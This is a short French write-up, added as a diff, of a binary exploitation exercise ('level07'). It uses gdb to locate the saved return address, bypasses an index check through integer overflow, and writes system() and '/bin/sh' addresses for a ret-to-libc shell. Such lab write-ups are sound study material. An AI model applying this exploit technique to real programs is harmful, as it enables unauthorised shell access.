@@ -1,0 +1,36 @@
+Ici, le binaire nous permet un certains nombre de commande .. (store, read, quit)
+
+Store nous permet de set une valeur a un indice donner,
+Read nous permet de lire a un indice donner
+Quit, Quit
+
+Nous n'avons que d'autre choix au niveau de commande
+
+gdb ./level07
+
+start
+info frame -> eip -> 0xf7e45513 === main's ret
+
+Nous allons essayer de reecrire l'eip avec un traditionnel ret-to-libc
+
+dans un premier temps nous allons regarder a quoi ressemble la stack en mettant des valeurs a des indices random ! Nous constatons que certains indice nous sont incaccesible.
+Nous pouvons reperer L'eip dans le tableau -> indice 114
+
+Store -> randomValue, indice == 114 ! Cela ne fonctionne aps. Trop facile :(
+
+Apres longue et multiple recherche, il semblerait que notre indice soit retravailler avant d'etre appliquer
+
+Nous essayons l'intmax negatif, nous arrivons a modifier des indice pourtant innaccessble avant, mais pas le 114.
+
+Same avec le positif, 2147483648, indice 0 inaccessible avant l'est maintenant ! +114 ?
+It works ! Nous avons reecris l'eip.
+
+find &system, +9999999, '/bin/sh' -> 4160264172 en decimal
+system -> 4159090384
+
+./level07
+
+store -> 4159090384 , index -> 2147483762 (114)
+store -> 4160264172 (/bin/sh) , index -> 116 
+
+Go !
